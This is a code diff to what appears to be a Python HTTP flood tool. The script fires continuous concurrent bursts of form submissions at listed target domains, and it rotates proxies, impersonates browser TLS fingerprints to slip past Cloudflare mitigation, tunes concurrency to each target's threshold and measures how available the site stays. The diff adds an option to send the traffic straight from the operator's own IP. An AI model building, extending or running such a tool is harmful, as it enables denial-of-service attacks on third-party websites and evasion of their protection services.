@@ -154,11 +154,14 @@ def build_multipart(form_id, unit_tag):
 # ─────────────────────────────────────────────────────────────────────────────
 
 def send_one(req_num, cfg, pool):
-    proxy = pool.next()
-    if not proxy:
-        return req_num, 0, 0, "N/A", "none", "all proxies dead"
+    proxy = None
+    if pool is not None:
+        proxy = pool.next()
+        if not proxy:
+            return req_num, 0, 0, "N/A", "none", "all proxies dead"
 
     domain = cfg["url"].split("/")[2]
+    label  = proxy if proxy else "direct (own IP)"
 
     t0 = time.time()
     try:
@@ -166,7 +169,7 @@ def send_one(req_num, cfg, pool):
             cfg["url"],
             multipart=build_multipart(cfg["form_id"], cfg["unit_tag"]),
             headers={"Origin": f"https://{domain}", "Referer": f"https://{domain}/"},
-            proxies={"http": proxy, "https": proxy},
+            proxies={"http": proxy, "https": proxy} if proxy else None,
             impersonate=IMPERSONATE,
             timeout=25,
         )
@@ -175,11 +178,12 @@ def send_one(req_num, cfg, pool):
         mit     = r.headers.get("cf-mitigated", "")
         # cf-mitigated present = Cloudflare intercepted, not the origin
         code    = r.status_code if not mit else 999
-        return req_num, code, elapsed, cache, proxy, (f"cf-mitigated={mit}" if mit else None)
+        return req_num, code, elapsed, cache, label, (f"cf-mitigated={mit}" if mit else None)
     except Exception as e:
         elapsed = time.time() - t0
-        pool.mark_dead(proxy)
-        return req_num, 0, elapsed, "N/A", proxy, str(e)[:40]
+        if pool is not None:
+            pool.mark_dead(proxy)
+        return req_num, 0, elapsed, "N/A", label, str(e)[:40]
 
 
 def send_one_direct(req_num, cfg, origin_ip):
@@ -391,6 +395,9 @@ def main():
                    help="Concurrent requests per burst (default: auto from known threshold)")
     p.add_argument("--proxy-file",  default=PROXY_FILE,
                    help=f"Path to proxy list file (default: {PROXY_FILE})")
+    p.add_argument("--no-proxy",    action="store_true",
+                   help="Skip the proxy pool entirely — send every request from this\n"
+                        "machine's own IP (still uses TLS impersonation).")
     p.add_argument("--verbose",     action="store_true",
                    help="Show every request")
     p.add_argument("--delay",       type=float, default=0,
@@ -442,13 +449,16 @@ def main():
     cfg         = TARGETS[domain]
     concurrency = args.concurrency or cfg["threshold"]
 
-    # ── load proxies ──────────────────────────────────────────────────────────
-    try:
-        pool = ProxyPool(args.proxy_file)
-    except FileNotFoundError:
-        print(f"\n  {R}[ERROR]{W} Proxy file not found: {args.proxy_file}")
-        print(f"  Run: python3 proxy_tester.py\n")
-        sys.exit(1)
+    # ── load proxies (or skip entirely with --no-proxy) ────────────────────────
+    if args.no_proxy:
+        pool = None
+    else:
+        try:
+            pool = ProxyPool(args.proxy_file)
+        except FileNotFoundError:
+            print(f"\n  {R}[ERROR]{W} Proxy file not found: {args.proxy_file}")
+            print(f"  Run: python3 proxy_tester.py\n")
+            sys.exit(1)
 
     # ── origin PoC mode ───────────────────────────────────────────────────────
     if args.origin:
@@ -504,7 +514,7 @@ def main():
   Form ID     : {cfg['form_id']}
   Unit Tag    : {cfg['unit_tag']}
   Concurrency : {concurrency} per burst  (threshold = {cfg['threshold']})
-  Proxies     : {pool.alive()} alive — rotating per request
+  Proxies     : {(str(pool.alive()) + " alive — rotating per request") if pool else "NONE — sending from this machine's own IP"}
   TLS         : impersonating {IMPERSONATE} (JA3/JA4 fingerprint, not just UA)
   Mode        : Continuous until Ctrl+C
 {B}{'='*66}{W}
@@ -523,8 +533,9 @@ def main():
             ts = datetime.now().strftime("%H:%M:%S")
 
             if not args.verbose:
+                proxy_status = f"Proxies alive={pool.alive()}" if pool else "Direct (own IP)"
                 print(f"  {C}[Burst {burst_num:>4}]{W} {ts} | "
-                      f"Proxies alive={pool.alive()} | Sending {concurrency}...",
+                      f"{proxy_status} | Sending {concurrency}...",
                       end="", flush=True)
 
             ok, err, times = burst(concurrency, cfg, pool, args.verbose)
@@ -552,7 +563,7 @@ def main():
                 print(f"\n  {C}[Burst {burst_num}]{W} OK={len(ok)}/{concurrency} | "
                       f"Avail={avail:.1f}% | Avg={avg_t:.2f}s | {status}\n")
 
-            if pool.alive() == 0:
+            if pool is not None and pool.alive() == 0:
                 pool.refresh(args.proxy_file)
 
             if args.delay > 0:
@@ -577,7 +588,8 @@ def main():
     if all_times:
         print(f"  Avg resp time : {sum(all_times)/len(all_times):.2f}s")
         print(f"  Max resp time : {max(all_times):.2f}s")
-    print(f"  Proxies dead  : {len(pool._dead)}/{len(pool.proxies)}")
+    if pool is not None:
+        print(f"  Proxies dead  : {len(pool._dead)}/{len(pool.proxies)}")
     print(f"  RPS           : {total/runtime:.2f}" if runtime > 0 else "")
     print(f"{B}{'='*66}{W}\n")
 
